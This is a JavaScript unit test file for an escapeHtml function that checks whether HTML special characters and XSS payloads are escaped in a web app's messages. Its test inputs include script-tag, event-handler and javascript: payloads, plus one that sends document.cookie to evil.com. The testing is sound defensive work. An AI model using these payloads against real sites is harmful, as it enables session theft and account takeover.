/**
 * HTML utility functions unit tests.
 *
 * Tests the escapeHtml function to ensure it properly neutralizes HTML special characters
 * and prevents HTML injection attacks.
 *
 * Security focus: Validates that all HTML special characters (&, <, >, ", ') are properly
 * escaped to their HTML entity equivalents.
 */

import { describe, expect, it } from "vitest";
import { escapeHtml } from "../html.js";

describe("escapeHtml", () => {
  it("escapes ampersand (&) to &amp;", () => {
    expect(escapeHtml("cats & dogs")).toBe("cats &amp; dogs");
    expect(escapeHtml("&")).toBe("&amp;");
    expect(escapeHtml("&&")).toBe("&amp;&amp;");
  });

  it("escapes less-than (<) to &lt;", () => {
    expect(escapeHtml("1 < 2")).toBe("1 &lt; 2");
    expect(escapeHtml("<")).toBe("&lt;");
    expect(escapeHtml("<<")).toBe("&lt;&lt;");
  });

  it("escapes greater-than (>) to &gt;", () => {
    expect(escapeHtml("2 > 1")).toBe("2 &gt; 1");
    expect(escapeHtml(">")).toBe("&gt;");
    expect(escapeHtml(">>")).toBe("&gt;&gt;");
  });

  it("escapes double quote (\") to &quot;", () => {
    expect(escapeHtml('Say "hello"')).toBe("Say &quot;hello&quot;");
    expect(escapeHtml('"')).toBe("&quot;");
    expect(escapeHtml('""')).toBe("&quot;&quot;");
  });

  it("escapes single quote (') to &#39;", () => {
    expect(escapeHtml("It's nice")).toBe("It&#39;s nice");
    expect(escapeHtml("'")).toBe("&#39;");
    expect(escapeHtml("''")).toBe("&#39;&#39;");
  });

  it("escapes script tags", () => {
    const input = '<script>alert("XSS")</script>';
    const expected = "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes img tags with onerror", () => {
    const input = '<img src=x onerror=alert(1)>';
    const expected = "&lt;img src=x onerror=alert(1)&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes iframe tags", () => {
    const input = '<iframe src="evil.com"></iframe>';
    const expected = "&lt;iframe src=&quot;evil.com&quot;&gt;&lt;/iframe&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes style tags", () => {
    const input = '<style>body{display:none}</style>';
    const expected = "&lt;style&gt;body{display:none}&lt;/style&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes anchor tags with href", () => {
    const input = '<a href="javascript:alert(1)">click</a>';
    const expected = "&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes HTML entities in attributes", () => {
    const input = '<div class="evil" onclick="alert(1)">text</div>';
    const expected = "&lt;div class=&quot;evil&quot; onclick=&quot;alert(1)&quot;&gt;text&lt;/div&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes multiple special characters in sequence", () => {
    const input = '<>&"\'';
    const expected = "&lt;&gt;&amp;&quot;&#39;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes complex HTML injection payload", () => {
    const input = '<script>fetch("https://evil.com?cookie="+document.cookie)</script>';
    const expected = "&lt;script&gt;fetch(&quot;https://evil.com?cookie=&quot;+document.cookie)&lt;/script&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes SVG-based XSS", () => {
    const input = '<svg onload=alert(1)>';
    const expected = "&lt;svg onload=alert(1)&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes data URI in img src", () => {
    const input = '<img src="data:text/html,<script>alert(1)</script>">';
    const expected = "&lt;img src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("handles empty string", () => {
    expect(escapeHtml("")).toBe("");
  });

  it("handles string with no special characters", () => {
    const input = "Hello World 123";
    expect(escapeHtml(input)).toBe(input);
  });

  it("handles string with only special characters", () => {
    const input = "&<>\"'";
    const expected = "&amp;&lt;&gt;&quot;&#39;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("preserves safe characters and escapes unsafe ones", () => {
    const input = "I love cats & dogs! <3 \"Best\" 'pets' > all";
    const expected = "I love cats &amp; dogs! &lt;3 &quot;Best&quot; &#39;pets&#39; &gt; all";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes ampersand before other entities (order matters)", () => {
    // This tests that & is escaped first, preventing double-escaping
    const input = "&lt;";
    const expected = "&amp;lt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes HTML comment syntax", () => {
    const input = "<!-- comment -->";
    const expected = "&lt;!-- comment --&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes CDATA section", () => {
    const input = "<![CDATA[evil]]>";
    const expected = "&lt;![CDATA[evil]]&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes meta refresh redirect", () => {
    const input = '<meta http-equiv="refresh" content="0;url=evil.com">';
    const expected = "&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=evil.com&quot;&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes object and embed tags", () => {
    const input = '<object data="evil.swf"></object>';
    const expected = "&lt;object data=&quot;evil.swf&quot;&gt;&lt;/object&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes form with action", () => {
    const input = '<form action="evil.com"><input type="submit"></form>';
    const expected = "&lt;form action=&quot;evil.com&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes base tag", () => {
    const input = '<base href="evil.com">';
    const expected = "&lt;base href=&quot;evil.com&quot;&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes link tag with stylesheet", () => {
    const input = '<link rel="stylesheet" href="evil.css">';
    const expected = "&lt;link rel=&quot;stylesheet&quot; href=&quot;evil.css&quot;&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes event handlers in various tags", () => {
    const input = '<div onmouseover="alert(1)">hover</div>';
    const expected = "&lt;div onmouseover=&quot;alert(1)&quot;&gt;hover&lt;/div&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes javascript: protocol in href", () => {
    const input = '<a href="javascript:void(0)">link</a>';
    const expected = "&lt;a href=&quot;javascript:void(0)&quot;&gt;link&lt;/a&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes vbscript: protocol", () => {
    const input = '<a href="vbscript:msgbox(1)">link</a>';
    const expected = "&lt;a href=&quot;vbscript:msgbox(1)&quot;&gt;link&lt;/a&gt;";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes newlines and special whitespace (preserved as-is)", () => {
    const input = "line1\nline2\tline3";
    const expected = "line1\nline2\tline3";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes unicode characters (preserved as-is)", () => {
    const input = "Hello 世界 🐱";
    const expected = "Hello 世界 🐱";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("escapes real-world adoption message with HTML", () => {
    const input = 'I would love to adopt this cat! <3 Please contact me at "best@email.com" & let\'s arrange a meeting.';
    const expected = "I would love to adopt this cat! &lt;3 Please contact me at &quot;best@email.com&quot; &amp; let&#39;s arrange a meeting.";
    expect(escapeHtml(input)).toBe(expected);
  });

  it("prevents stored XSS in email context", () => {
    // This is the exact attack vector from the pentest finding
    const maliciousMessage = '<script>alert("XSS")</script><img src=x onerror=alert(1)>';
    const escaped = escapeHtml(maliciousMessage);
    
    // Verify the escaped output cannot execute as HTML
    expect(escaped).not.toContain("<script>");
    expect(escaped).not.toContain("</script>");
    expect(escaped).not.toContain("<img");
    // Note: "onerror=" is still present as text, but the < and > are escaped
    // so it cannot be interpreted as an HTML attribute
    
    // Verify it contains the escaped versions
    expect(escaped).toContain("&lt;script&gt;");
    expect(escaped).toContain("&lt;/script&gt;");
    expect(escaped).toContain("&lt;img");
    
    // The full escaped string should be safe
    expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;');
  });
});
